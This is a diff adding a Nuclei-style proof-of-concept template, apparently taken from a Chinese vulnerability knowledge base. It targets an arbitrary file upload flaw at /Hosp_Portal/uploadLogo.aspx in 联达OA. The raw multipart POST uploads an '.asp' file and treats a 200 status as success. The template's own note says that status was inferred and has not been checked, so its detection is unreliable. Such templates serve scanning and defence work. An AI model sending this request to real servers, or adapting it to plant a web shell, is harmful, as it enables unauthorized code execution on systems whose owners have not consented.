@@ -1,0 +1,45 @@
+id: poc-fw5t9ztkg7ud3r3p
+info:
+  name: 联达OA uploadLogo.aspx存在任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fw5t9ztkg7ud3r3p
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fw5t9ztkg7ud3r3p
+http:
+- raw:
+  - 'POST /Hosp_Portal/uploadLogo.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 191
+
+    Content-Type: multipart/form-data; boundary=------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+
+    --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
+
+    Content-Disposition: form-data; name="DesignId"
+
+
+    1
+
+    --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
+
+    Content-Disposition: form-data; name="Filedata";filename="123.asp"
+
+
+    123
+
+    --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
